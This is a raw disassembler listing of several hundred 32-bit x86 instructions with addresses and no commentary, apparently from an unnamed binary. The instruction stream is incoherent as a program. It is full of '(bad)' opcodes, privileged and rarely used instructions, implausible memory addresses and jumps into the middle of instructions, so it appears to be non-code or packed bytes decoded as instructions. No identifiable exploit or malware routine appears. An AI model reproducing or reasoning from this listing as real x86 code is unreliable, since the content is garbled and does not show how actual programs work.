  432375:	push   ebp
  432376:	pop    ebp
  432377:	mov    esi,DWORD PTR [edx-0x38]
  43237a:	add    DWORD PTR [eax],0x28
  43237d:	mov    edi,DWORD PTR [ebx]
  43237f:	xor    esi,DWORD PTR [edx+0x3]
  432382:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432386:	pop    ebp
  432387:	or     al,0x4
  432389:	inc    ecx
  43238a:	push   ebp
  43238b:	(bad)  
  43238c:	in     al,dx
  43238d:	or     ah,ch
  43238f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432390:	xbegin 0xffc89986
  432396:	clc    
  432397:	adc    al,0x45
  432399:	div    BYTE PTR [edx]
  43239b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4323a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4323a8:	add    BYTE PTR [ecx+0x66],dh
  4323ab:	add    eax,DWORD PTR [ebp+0x52]
  4323ae:	adc    eax,0xffffffa0
  4323b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4323b7:	test   DWORD PTR [eax],eax
  4323b9:	clc    
  4323ba:	data16 or al,BYTE PTR [ebp+0x45]
  4323be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4323c5:	rol    BYTE PTR [ebp+0x45],1
  4323c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4323ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4323d4:	push   ebx
  4323d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4323d9:	jge    0x43240e
  4323db:	add    BYTE PTR [esi+0x4],dl
  4323de:	jne    0x432445
  4323e0:	mov    edx,0x457200
  4323e5:	jmp    0x4323a9
  4323e7:	xor    edi,DWORD PTR [ebx]
  4323e9:	pop    edi
  4323ea:	cvtdq2ps xmm7,xmm0
  4323ed:	ret    0x0
  4323f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323f6:	xor    ecx,DWORD PTR [edi]
  4323f8:	add    eax,DWORD PTR [ecx+0x3b]
  4323fb:	push   ebx
  4323fc:	rdpmc  
  4323fe:	out    0x8d,al
  432400:	add    BYTE PTR [eax],cl
  432402:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432408:	ret    0x450c
  43240b:	sbb    al,0x8b
  43240d:	cmp    eax,esi
  43240f:	or     cl,al
  432411:	or     al,0xc2
  432413:	pop    eax
  432414:	inc    ebp
  432415:	add    ecx,DWORD PTR [edi]
  432417:	add    esi,DWORD PTR [ebp+0x39]
  43241a:	invd   
  43241c:	jge    0x432428
  43241e:	mov    eax,0x478ac0
  432423:	cli    
  432424:	xor    esp,ecx
  432426:	mov    ebx,0x5b8ac0
  43242b:	ret    0x33
  43242e:	mov    eax,0x833b8b
  432433:	sub    BYTE PTR [ebx],al
  432435:	inc    ebp
  432436:	xor    ax,di
  432439:	pushf  
  43243a:	inc    bh
  43243c:	mov    esp,esp
  43243e:	hlt    
  43243f:	test   DWORD PTR [ebp-0x8],esi
  432442:	mov    eax,DWORD PTR [ebp-0x14]
  432445:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43244b:	dec    edi
  43244c:	or     BYTE PTR [eax],al
  43244e:	jne    0x4323d9
  432450:	mov    esi,esp
  432452:	call   0x77a9b017
  432457:	inc    ebp
  432458:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43245e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432464:	add    BYTE PTR [esi+0x7d],ah
  432467:	inc    ebp
  432468:	mov    bx,WORD PTR [ebp+0x8]
  43246c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432473:	inc    ebp
  432474:	mov    bx,di
  432477:	lock test BYTE PTR [ecx+0x7000801],bh
  43247e:	jge    0x432441
  432480:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432486:	cli    
  432487:	xor    bl,bh
  432489:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43248f:	test   BYTE PTR [eax],cl
  432491:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432498:	cmp    ebp,eax
  43249a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4324a1:	test   BYTE PTR [ebp+0x1],bh
  4324a4:	mov    ebx,0x458a00
  4324a9:	xor    esi,DWORD PTR [ebx]
  4324ab:	add    esp,DWORD PTR [esi-0x77]
  4324ae:	pop    ebp
  4324af:	loopne 0x432517
  4324b1:	inc    ebp
  4324b2:	clc    
  4324b3:	xor    edi,DWORD PTR [ebx]
  4324b5:	add    esi,DWORD PTR [edx-0x77]
  4324b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4324bc:	mov    ebx,0xb78afc
  4324c1:	hlt    
  4324c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4324c5:	add    BYTE PTR [ebp+0x66],bl
  4324c8:	data16 lock clc 
  4324cb:	cmp    al,0x3b
  4324cd:	add    BYTE PTR [edi+0x66],dh
  4324d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4324d4:	ltr    WORD PTR [ebp+0x66]
  4324d8:	add    esi,eax
  4324da:	add    di,WORD PTR [ebp+0x2b]
  4324de:	data16 data16 jge 0x43255f
  4324e2:	mov    ebx,0xe08a8b
  4324e7:	jge    0x43251c
  4324e9:	data16 data16 xor al,0x5d
  4324ed:	data16 data16 jne 0x4324e9
  4324f1:	mov    edi,DWORD PTR [ebx]
  4324f3:	fdiv   QWORD PTR [edx+0x7d]
  4324f6:	data16 data16 jge 0x43252e
  4324fa:	mov    ebx,0x758a66
  4324ff:	mov    esi,0x667233
  432504:	pop    ebp
  432505:	or     BYTE PTR [esi+0x0],ah
  432508:	clc    
  432509:	mov    edi,DWORD PTR [ebx]
  43250b:	lock ja 0x432499
  43250e:	(bad)  
  432510:	jge    0x432509
  432512:	invd   
  432514:	pop    ebp
  432515:	add    BYTE PTR [ebx],al
  432517:	(bad)  
  432518:	cmp    di,WORD PTR [ebp+0xf]
  43251c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432520:	mov    bx,WORD PTR [ebp-0x10]
  432524:	pop    bp
  432526:	fbstp  TBYTE PTR [ebx]
  432528:	test   DWORD PTR [ebx],eax
  43252a:	add    BYTE PTR [ebx],bh
  43252c:	add    BYTE PTR [esi+0x7d],ah
  43252f:	jge    0x4324bc
  432531:	data16 in al,dx
  432533:	pop    ebp
  432534:	stc    
  432535:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43253c:	mov    edi,ebx
  43253e:	in     al,dx
  43253f:	test   BYTE PTR [ebp+0x0],bh
  432542:	mov    eax,DWORD PTR [eax]
  432544:	call   0xbd401ed4
  432549:	cmp    al,0x9b
  43254b:	add    BYTE PTR [edx],dh
  43254d:	mov    bx,di
  432550:	call   0x8b4ba2e0
  432555:	add    ebp,esp
  432557:	mov    bx,di
  43255a:	jnp    0x432582
  43255c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432562:	mov    eax,DWORD PTR [eax]
  432564:	call   0x7c3eb0cf
  432569:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43256f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432574:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43257e:	fisttp WORD PTR [ecx-0x7401f77b]
  432584:	(bad)  
  432585:	cld    
  432586:	jne    0x4325c4
  432588:	xor    eax,DWORD PTR [eax]
  43258a:	mov    esp,DWORD PTR [esi-0x10]
  43258d:	sti    
  43258e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432595:	data16 adc bl,bh
  432598:	push   ebp
  432599:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4325a0:	mov    WORD PTR [eax],es
  4325a2:	fwait
  4325a3:	data16 xor bh,bl
  4325a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4325ac:	mov    esp,DWORD PTR [esi-0x14]
  4325af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4325b5:	or     al,0x2b
  4325b7:	mov    bh,0xba
  4325b9:	hlt    
  4325ba:	mov    bh,bl
  4325bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4325c2:	dec    esi
  4325c3:	or     al,0x0
  4325c5:	mov    edi,DWORD PTR [ebx]
  4325c7:	or     BYTE PTR [ebp+0x3b],dh
  4325ca:	mov    ecx,DWORD PTR [edi]
  4325cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4325d2:	xor    al,0xd8
  4325d4:	pop    bp
  4325d6:	lock xor esi,DWORD PTR [ebx]
  4325d9:	lea    esp,[esi+0x1f]
  4325dc:	icebp  
  4325dd:	jb     0x4325e3
  4325df:	add    al,al
  4325e1:	jge    0x4325ef
  4325e3:	mov    eax,eax
  4325e5:	fsubr  st,st(3)
  4325e7:	pop    ebp
  4325e8:	mov    esi,DWORD PTR [ebx]
  4325ea:	in     al,0x8d
  4325ec:	rcr    DWORD PTR [edi],0xc2
  4325ef:	jb     0x43264f
  4325f1:	add    cl,cl
  4325f3:	jge    0x432601
  4325f5:	mov    edx,DWORD PTR [ebp-0x20]
  4325f8:	in     al,dx
  4325f9:	pop    ebp
  4325fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325ff:	cmp    di,WORD PTR [ebp+0x0]
  432603:	mov    ebp,DWORD PTR [ebx]
  432605:	fdivr  QWORD PTR [esi+0x668a5d]
  43260b:	cmp    al,0x33
  43260d:	mov    si,0x4e7d
  432611:	mov    eax,DWORD PTR [eax]
  432613:	lock inc ebp
  432615:	mov    esi,DWORD PTR [eax]
  432617:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43261e:	clc    
  43261f:	(bad)  
  432620:	cmp    edi,DWORD PTR [ebx]
  432622:	je     0x432633
  432624:	push   ebx
  432625:	loopne 0x432636
  432627:	dec    ecx
  432629:	mov    esp,DWORD PTR [ebp-0x1c]
  43262c:	int    0xf1
  43262e:	mov    esi,0x703084d
  432633:	pcmpgtd mm6,mm1
  432636:	add    BYTE PTR [ebp+0x66],dh
  432639:	jmp    0x432606
  43263b:	mov    eax,DWORD PTR [ebx]
  43263d:	lock push ebp
  43263f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432645:	or     bh,dl
  432647:	jb     0x432647
  432649:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43264f:	loopne 0x432651
  432651:	jne    0x432655
  432653:	data16 add BYTE PTR [esi+eiz*2],dh
  432657:	mov    ecx,ebx
  432659:	data16 cmp al,0xf1
  43265c:	add    BYTE PTR [esi+eiz*2],bh
  43265f:	add    bl,cl
  432661:	retw   0xf2
  432665:	ret    0x66
  432668:	retf   
  432669:	enterw 0x4df1,0x19
  43266e:	pop    edi
  43266f:	jne    0x4325f2
  432671:	mov    esi,DWORD PTR [eax]
  432673:	call   0x77b7b214
  432678:	xor    ebp,DWORD PTR [ebx]
  43267a:	lea    esp,[esi+0x48]
  43267d:	repnz in eax,0x3b
  432680:	add    BYTE PTR [ebp-0x37],dh
  432683:	xor    edx,DWORD PTR [ebp-0x15]
  432686:	in     al,dx
  432687:	xor    edx,DWORD PTR [esi+0x40]
  43268a:	mov    DWORD PTR [edi],0x338545fc
  432690:	clc    
  432691:	add    esi,DWORD PTR [ecx]
  432693:	pop    edi
  432694:	pushf  
  432695:	pop    ebx
  432696:	call   0xff44265d
  43269b:	mov    edi,eax
  43269d:	push   ecx
  43269e:	pop    es
  43269f:	mov    edi,DWORD PTR [eax]
  4326a1:	push   esi
  4326a2:	inc    esi
  4326a3:	add    bh,BYTE PTR [esi+0x0]
  4326a6:	popa   
  4326a7:	data16 (bad) 
  4326a9:	into   
  4326aa:	gs cmp al,0xcd
  4326ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4326b3:	ret    0x66
  4326b6:	add    bh,al
  4326b8:	add    bh,ah
  4326ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4326c0:	cmp    al,0x9c
  4326c2:	add    BYTE PTR [esi+0x66],ah
  4326c5:	into   
  4326c6:	ret    
  4326c7:	pop    ebp
  4326c8:	adc    BYTE PTR [edi+0x0],dl
  4326cb:	mov    bh,0x66
  4326cd:	mov    edi,0xff038dc3
  4326d2:	jne    0x432728
  4326d4:	lea    edx,[ecx+0x1]
  4326d7:	mov    ebx,0xd64ff1
  4326dc:	sar    DWORD PTR [ebx],1
  4326de:	test   BYTE PTR [ebp+0x36],dh
  4326e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326e5:	push   edi
  4326e6:	xor    BYTE PTR [ebx],0x38
  4326e9:	mov    esi,ebx
  4326eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4326f1:	ss inc ebp
  4326f3:	fs pop ebx
  4326f5:	mov    ebx,0x9c3b30
  4326fa:	je     0x432727
  4326fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432702:	mov    WORD PTR [ebx],?
  432704:	ss mov ebx,0x8b4e64
  43270a:	pop    edi
  43270b:	cmp    ecx,ecx
  43270d:	jne    0x432764
  43270f:	mov    ebp,esp
  432711:	cld    
  432712:	push   esi
  432713:	pop    ebx
  432714:	inc    ebp
  432715:	stc    
  432716:	xor    BYTE PTR [ebp+0x9bef89c],al
  43271c:	test   esi,ecx
  43271e:	clc    
  43271f:	test   dl,dl
  432721:	cmp    bh,bh
  432723:	fs pop si
  432726:	or     bl,al
  432728:	add    cl,BYTE PTR [ebx+0x57665100]
  43272e:	retf   0x3c45
  432731:	xor    BYTE PTR [eax],al
  432733:	pushf  
  432734:	mov    si,0x85ca
  432738:	ret    0xf8
  43273b:	pop    ebx
  43273c:	dec    dx
  43273f:	mov    edx,DWORD PTR [edi-0x76]
  432742:	push   edi
  432743:	add    al,0xb7
  432745:	xor    al,0xba
  432747:	cmp    al,0x8d
  432749:	je     0x43274a
  43274b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43274f:	lea    edi,[ebx+0x544fff]
  432755:	push   ecx
  432756:	cmp    edx,DWORD PTR [ebx+0x75]
  432759:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43275f:	add    BYTE PTR [ebx],dh
  432761:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432767:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43276e:	mov    ebx,0x3b3b00
  432773:	jne    0x4327a0
  432775:	mov    DWORD PTR [ebx+0x728afc],edi
  43277b:	xor    esi,DWORD PTR [ebx]
  43277d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432783:	push   edi
  432784:	cmp    esp,ebp
  432786:	jne    0x432788
  432788:	sbb    DWORD PTR [eax],0x8085c3fc
  43278e:	clc    
  43278f:	inc    esi
  432790:	pop    ebx
  432791:	sti    
  432792:	add    eax,0xeb8bc075
  432797:	cld    
  432798:	xor    edi,DWORD PTR ds:0xf8c3855e
  43279e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4327a1:	rol    DWORD PTR [ebp-0x37],0xf
  4327a5:	mov    DWORD PTR [eax],ecx
  4327a7:	inc    edi
  4327a8:	(bad)  
  4327a9:	in     eax,0xfe
  4327ab:	add    bh,bh
  4327ad:	(bad)  
  4327ae:	mov    esi,0xc38a5e
  4327b3:	mov    esi,DWORD PTR [ebx]
  4327b5:	push   ecx
  4327b6:	mov    edi,0xfc4ec7
  4327bb:	test   DWORD PTR [ebp-0x8],edx
  4327be:	xor    di,ax
  4327c1:	pushf  
  4327c2:	sub    ebp,eax
  4327c4:	inc    ebp
  4327c5:	(bad)  
  4327c6:	sub    edi,edi
  4327c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4327ce:	inc    ebp
  4327cf:	add    BYTE PTR [esi+0x2b],ah
  4327d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4327d8:	cmp    al,0x33
  4327da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4327e0:	(bad)  
  4327e1:	cmp    esi,DWORD PTR [ebx]
  4327e3:	je     0x43279d
  4327e5:	push   ebx
  4327e6:	dec    esi
  4327e7:	str    ecx
  4327ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4327ed:	int    0x33
  4327ef:	mov    edi,0x789085f
  4327f4:	mov    edx,DWORD PTR [eax]
  4327f6:	cld    
  4327f7:	add    cl,cl
  4327f9:	data16 add al,0xcb
  4327fc:	push   ebp
  4327fd:	add    ebp,esp
  4327ff:	jne    0x4327ed
  432801:	(bad)  
  432802:	mov    DWORD PTR [ecx],0xd685f7ec
  432808:	clc    
  432809:	xlat   BYTE PTR ds:[ebx]
  43280a:	inc    ebp
  43280b:	mov    esi,DWORD PTR [edx]
  43280d:	push   eax
  43280e:	pushf  
  43280f:	in     eax,0x8b
  432811:	add    ah,ch
  432813:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432817:	add    ax,0x72cb
  43281b:	cmp    al,0x0
  43281d:	add    BYTE PTR [ebp+0x66],al
  432820:	(bad)  
  432821:	retf   
  432822:	lock ret 0x85
  432826:	clc    
  432827:	inc    bp
  432829:	retf   
  43282a:	cmp    eax,0xc77d9cc8
  43282f:	xor    ah,bh
  432831:	pushf  
  432832:	test   DWORD PTR [edi-0x8],ebx
  432835:	je     0x43287c
  432837:	xor    esi,DWORD PTR ds:0x7020840
  43283d:	ror    BYTE PTR [ebp-0x37],0x8d
  432841:	push   ebp
  432842:	add    esp,ebp
  432844:	jb     0x4327d1
  432846:	add    BYTE PTR [eax],cl
  432848:	dec    ebp
  432849:	mov    bh,0x81
  43284b:	push   esi
  43284c:	push   esp
  43284d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432854:	xor    al,BYTE PTR [eax]
  432856:	mov    edx,DWORD PTR [edi+0x10]
  432859:	(bad)  
  43285a:	scas   eax,DWORD PTR es:[edi]
  43285b:	ret    0x3b
  43285e:	jns    0x3b442551
  432864:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432868:	dec    ebp
  432869:	or     BYTE PTR [ebx],ch
  43286b:	ret    0x458b
  43286e:	lock jmp 0x432862
  432871:	mov    ecx,DWORD PTR [eax]
  432873:	or     BYTE PTR [edi],al
  432875:	mov    ecx,eax
  432877:	xor    DWORD PTR [edx+0x2],0x0
  43287b:	mov    bh,0xc1
  43287d:	adc    BYTE PTR [eax],dh
  43287f:	iret   
  432880:	inc    ebp
  432881:	mov    DWORD PTR [ebx],0x4dfff8c4
  432887:	inc    BYTE PTR [ebx]
  432889:	ret    0xf8
  43288c:	adc    DWORD PTR [esi+0x10],esp
  43288f:	clc    
  432890:	dec    ecx
  432891:	fisttp WORD PTR [ecx+0x456604c0]
  432897:	add    dh,BYTE PTR ds:0x75e0845
  43289d:	ret    0x4d
  4328a0:	lea    ecx,[ebx+0x18728301]
  4328a6:	add    BYTE PTR [ebp+0x45],al
  4328a9:	xor    ecx,ebp
  4328ab:	pushf  
  4328ac:	add    bh,al
  4328ae:	add    al,ch
  4328b0:	inc    ebp
  4328b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4328b7:	xor    eax,0x781084d
  4328bc:	push   esp
  4328bd:	fwait
  4328be:	push   ecx
  4328bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4328c5:	inc    ebp
  4328c6:	cmp    edi,DWORD PTR [ecx]
  4328c8:	jbe    0x432866
  4328ca:	mov    eax,edi
  4328cc:	or     ah,dh
  4328ce:	inc    ebp
  4328cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4328d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4328db:	in     al,dx
  4328dc:	hlt    
  4328dd:	push   esp
  4328de:	push   esp
  4328df:	push   ecx
  4328e0:	push   ecx
  4328e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328e7:	fwait
  4328e8:	fwait
  4328e9:	xor    dh,BYTE PTR [edx]
  4328eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4328f1:	or     BYTE PTR [ebp+0x7],al
  4328f4:	mov    eax,ecx
  4328f6:	clc    
  4328f7:	jb     0x4328ba
  4328f9:	add    BYTE PTR [ebp+0x55],cl
  4328fc:	or     DWORD PTR [edi],0xc251d154
  432902:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43290c:	mov    edi,eax
  43290e:	or     cl,al
  432910:	inc    ebp
  432911:	dec    ebp
  432912:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432918:	or     WORD PTR [ecx],0x899b
  43291d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432923:	mov    edx,DWORD PTR [ecx+0x8]
  432926:	mov    eax,DWORD PTR [ebp-0x8]
  432929:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432930:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432936:	inc    ebp
  432937:	dec    eax
  432938:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  43293e:	add    edx,DWORD PTR [ecx-0x8]
  432941:	mov    ecx,DWORD PTR [ecx]
  432943:	clc    
  432944:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  43294b:	mov    ecx,ebp
  43294d:	clc    
  43294e:	(bad)  
  43294f:	popf   
  432950:	inc    DWORD PTR [eax]
  432952:	ret    0x8b
  432955:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43295b:	mov    edi,esp
  43295d:	hlt    
  43295e:	test   ecx,esi
  432960:	clc    
  432961:	or     BYTE PTR [ebp+0x7],al
  432964:	xor    al,cl
  432966:	pushf  
  432967:	jb     0x43299c
  432969:	add    BYTE PTR [eax-0x3f],al
  43296c:	inc    eax
  43296d:	daa    
  43296e:	inc    ebp
  43296f:	inc    ebp
  432970:	xor    eax,0x7f80803
  432975:	dec    ebp
  432976:	fwait
  432977:	add    esi,DWORD PTR [edx]
  432979:	clc    
  43297a:	cmp    DWORD PTR [ecx],ecx
  43297c:	or     al,0x8
  43297e:	add    al,BYTE PTR [ebp+0x2c]
  432981:	xor    eax,0x7350845
  432986:	or     BYTE PTR [ebp+0x7],cl
  432989:	lea    ebx,[ebx-0x748dcdff]
  43298f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432996:	mov    edx,DWORD PTR [eax]
  432998:	cld    
  432999:	dec    ebp
  43299a:	push   esp
  43299b:	sub    edx,DWORD PTR [ecx-0x75]
  43299e:	add    eax,0xf172fc
  4329a3:	or     BYTE PTR [ebp+0x7],cl
  4329a6:	add    eax,ecx
  4329a8:	or     al,0x72
  4329aa:	add    DWORD PTR [eax],eax
  4329ac:	mov    ebx,0x29c2c1
  4329b1:	inc    ebp
  4329b2:	mov    eax,DWORD PTR [ebx]
  4329b4:	cmp    eax,0x3004d1c
  4329ba:	xbegin 0x66c8b5b4
  4329c0:	clc    
  4329c1:	or     BYTE PTR [ebp+0x45],al
  4329c4:	xor    dh,BYTE PTR ds:0x78b089c
  4329ca:	adc    BYTE PTR [ebp+0x45],cl
  4329cd:	lea    eax,[ebp+0x33727501]
  4329d3:	add    cl,ch
  4329d5:	inc    ebp
  4329d6:	add    bl,ch
  4329d8:	add    BYTE PTR [ebx+0x45850845],cl
  4329de:	je     0x43296b
  4329e0:	push   ebx
  4329e1:	or     al,0x85
  4329e3:	dec    ebp
  4329e4:	std    
  4329e5:	mov    bh,bh
  4329e7:	mov    BYTE PTR [ebp-0x75],al
  4329ea:	mov    edi,eax
  4329ec:	or     al,0x89
  4329ee:	inc    ebp
  4329ef:	clc    
  4329f0:	mov    esp,esp
  4329f2:	hlt    
  4329f3:	call   DWORD PTR [edi-0x37]
  4329f6:	push   esp
  4329f7:	or     al,0x51
  4329f9:	push   ebp
  4329fa:	xor    ebp,esp
  4329fc:	mov    esi,0x457251
  432a01:	xor    esi,eax
  432a03:	pushf  
  432a04:	inc    ebp
  432a05:	(bad)  
  432a06:	mov    edi,eax
  432a08:	or     al,0x85
  432a0a:	add    al,bh
  432a0c:	inc    eax
  432a0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a12:	or     ah,bh
  432a14:	inc    eax
  432a15:	push   esp
  432a16:	jmp    0x432a69
  432a18:	mov    eax,DWORD PTR ds:0xe8720c
  432a1e:	mov    DWORD PTR [ebp-0x8],eax
  432a21:	jne    0x432a68
  432a23:	jmp    0x4329b0
  432a25:	mov    ebp,DWORD PTR [eax]
  432a27:	clc    
  432a28:	retf   0xff54
  432a2b:	push   ecx
  432a2c:	mov    DWORD PTR ds:0x757210,eax
  432a32:	mov    ecx,DWORD PTR [ebp-0x4]
  432a35:	sub    esp,DWORD PTR [ebx-0x77]
  432a38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a3f:	or     ah,bh
  432a41:	pop    es
  432a42:	ds fwait
  432a44:	push   DWORD PTR [edx]
  432a46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432a4c:	(bad)  
  432a4d:	mov    bh,bh
  432a4f:	jmp    0x432a3d
  432a51:	leave  
  432a52:	jne    0x432a5c
  432a54:	call   0x3023ae
  432a59:	in     al,dx
  432a5a:	dec    ebp
  432a5b:	add    dh,BYTE PTR [ebx]
  432a5d:	add    BYTE PTR [ebx],al
  432a5f:	inc    ebp
  432a60:	cmp    esi,DWORD PTR [ecx]
  432a62:	je     0x432a00
  432a64:	mov    eax,edi
  432a66:	or     al,0xf0
  432a68:	add    BYTE PTR [ebp+0x458bf845],al
  432a6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a74:	adc    al,0x7
  432a76:	enter  0x9fc0,0xa5
  432a7a:	rol    BYTE PTR [eax],0x5e
  432a7d:	mov    ecx,ecx
  432a7f:	or     al,0xc
  432a81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a88:	jmp    0x432a89
  432a8a:	push   ebp
  432a8b:	mov    esp,ebp
  432a8d:	cld    
  432a8e:	inc    ebp
  432a8f:	inc    ebp
  432a90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a97:	push   esi
  432a98:	push   esi
  432a99:	mov    edi,0x7af080f
  432a9e:	add    bh,al
  432aa0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432aa6:	add    BYTE PTR [ecx+0x4540100f],cl
  432aac:	mov    ebp,eax
  432aae:	mov    ebp,edi
  432ab0:	lock call edx
  432ab3:	fcom   DWORD PTR [ebp+0x45]
  432ab6:	mov    eax,0x148a8b
  432abb:	push   ecx
  432abc:	enter  0xc145,0x83
  432ac0:	cmp    ecx,DWORD PTR [eax]
  432ac2:	add    BYTE PTR [ebp+0x4d],al
  432ac5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432acb:	call   0xffa3263a
  432ad0:	cmp    eax,DWORD PTR [ebp-0xc]
  432ad3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432ad7:	push   ebp
  432ad8:	(bad)  
  432ad9:	call   0x3428dd
  432ade:	mov    bh,0xdb
  432ae0:	cld    
  432ae1:	or     BYTE PTR [ebp+0x45],bl
  432ae4:	(bad)  
  432ae5:	call   0xff7d2775
  432aea:	add    al,BYTE PTR [ebp+0x37]
  432aed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432af3:	jne    0x432af5
  432af5:	(bad)  
  432af6:	cmp    edi,esp
  432af8:	jne    0x432b2b
  432afa:	mov    edi,edi
  432afc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b02:	pop    ds
  432b03:	into   
  432b04:	je     0x432ac7
  432b06:	mov    ebx,DWORD PTR [esi]
  432b08:	or     BYTE PTR [ebp-0x49],al
  432b0b:	mov    esp,DWORD PTR [esi-0x77]
  432b0e:	mov    esi,0x2451f0c
  432b13:	mov    eax,DWORD PTR [eax]
  432b15:	or     al,0x66
  432b17:	sar    bl,0x3b
  432b1a:	xor    esi,DWORD PTR [ebp+0x66]
  432b1d:	xor    ecx,edi
  432b1f:	pop    edi
  432b20:	adc    bl,BYTE PTR [ebx+0x7e]
  432b23:	ret    0xff
  432b26:	cld    
  432b27:	inc    ebp
  432b28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432b2e:	cld    
  432b2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432b36:	push   0xffffff83
  432b38:	pop    edi
  432b39:	or     BYTE PTR [ebp+0x53],dh
  432b3c:	xorps  xmm1,xmm2
  432b3f:	test   BYTE PTR [eax+eax*1],bh
  432b42:	add    BYTE PTR [eax],al
  432b44:	adc    eax,eax
  432b46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432b4e:	jmp    DWORD PTR [eax]
  432b50:	ror    al,0x5e
  432b53:	inc    ebp
  432b54:	leave  
  432b55:	xor    ecx,DWORD PTR [eax]
  432b57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432b5d:	add    ah,al
  432b5f:	xor    edi,edi
  432b61:	xor    DWORD PTR [ebx],0x66003302
  432b67:	mov    DWORD PTR [ebp-0xc],ecx
  432b6a:	pcmpgtw mm0,mm0
  432b6d:	add    dl,ah
  432b6f:	leave  
  432b70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b74:	push   eax
  432b75:	dec    ebp
  432b76:	mov    esi,DWORD PTR [ebx-0x75]
  432b79:	lea    ebp,[eax-0x7c00ff02]
  432b7f:	xor    eax,DWORD PTR [eax]
  432b81:	sysret 
  432b83:	dec    ebp
  432b84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b8b:	push   WORD PTR [ecx+0x8]
  432b8f:	jne    0x432b52
  432b91:	ud0    ecx,DWORD PTR [ecx]
  432b94:	mov    eax,edx
  432b96:	lods   al,BYTE PTR ds:[esi]
  432b97:	add    BYTE PTR [eax],al
  432b99:	data16 (bad) 
  432b9b:	iret   
  432b9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ba3:	cli    
  432ba4:	inc    ebp
  432ba5:	cmp    al,0x8d
  432ba7:	add    BYTE PTR [esi+0x2d],ah
  432baa:	inc    ebp
